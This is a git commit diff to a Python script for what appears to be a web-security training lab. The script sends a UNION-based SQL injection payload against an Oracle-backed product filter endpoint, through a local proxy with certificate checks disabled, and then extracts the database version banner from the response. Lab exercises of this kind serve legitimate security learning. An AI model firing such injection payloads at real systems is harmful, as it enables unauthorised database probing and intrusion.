860d75f9f352d42d5dc49ec1860d492b7c415a73
Ashwin Adhikari <adhikariaswin7@gmail.com>
2024-10-18 18:32:52 +0545

    Added lab3 script

--- Labs/lab-03.py
+++ Labs/lab-03.py
@@ -1,6 +1,10 @@
+# Lab3 - Querying the database type and version Oracle
+
 import sys
 import requests
 import urllib3
+import re
+from bs4 import BeautifulSoup
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 proxies={'https':'http://127.0.0.1:8080','http':'http://127.0.0.1:8080'}
@@ -9,12 +13,18 @@ def exploit_sqli(url):
     uri = '/filter?category=Gifts'
     payload="'union select banner, null from v$version--"
     print(f"Sending request to {url + uri + payload}")
+    
     try:
         r= requests.get(url + uri + payload,verify=False,proxies=proxies)
+        res = r.text
+        
     except Exception as e:
         print(f"Error: {e}")
         return False
-    if "Oracle Database" in r.text:
+    if "Oracle Database" in res:
+        soup = BeautifulSoup(res,'html.parser')
+        version = soup.find(string=re.compile('.*Oracle\sDatabase.*'))
+        print("[+] Database Version is: "+ version)
         return True
 
 if __name__=="__main__":
